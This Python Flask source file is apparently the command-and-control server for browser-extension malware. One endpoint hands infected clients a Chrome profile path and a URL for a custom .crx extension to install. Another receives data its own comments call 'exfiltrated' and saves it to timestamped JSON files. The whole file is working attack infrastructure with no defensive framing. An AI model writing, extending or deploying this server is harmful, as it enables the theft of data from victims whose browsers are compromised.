from flask import Flask, request, jsonify, abort
from datetime import datetime
import os
import json

app = Flask(__name__)

# Secret authentication key
AUTH_KEY = "your_secret_auth_key"

# Directory to store exfiltrated data
DATA_DIR = "exfiltrated_data"
os.makedirs(DATA_DIR, exist_ok=True)

def check_auth(auth_key):
    """Check if the provided auth key is valid."""
    return auth_key == AUTH_KEY

@app.route('/config', methods=['POST'])
def get_config():
    # Check for authentication
    auth_key = request.headers.get('Authorization')
    if not check_auth(auth_key):
        abort(403)  # Forbidden

    # Receive system info and return configuration
    system_info = request.json
    print("Received system info:", system_info)

    # Example configuration response
    config = {
        "ChromeProfilePath": None,  # Use default path
        "ExtensionUrl": "https://example.com/custom-extension.crx"
    }
    return jsonify(config)

@app.route('/api', methods=['POST'])
def receive_data():
    # Check for authentication
    auth_key = request.headers.get('Authorization')
    if not check_auth(auth_key):
        abort(403)  # Forbidden

    # Receive exfiltrated data
    data = request.json
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Save data to a file
    file_path = os.path.join(DATA_DIR, f"exfiltrated_data_{timestamp}.json")
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

    print(f"Data saved to {file_path}")
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
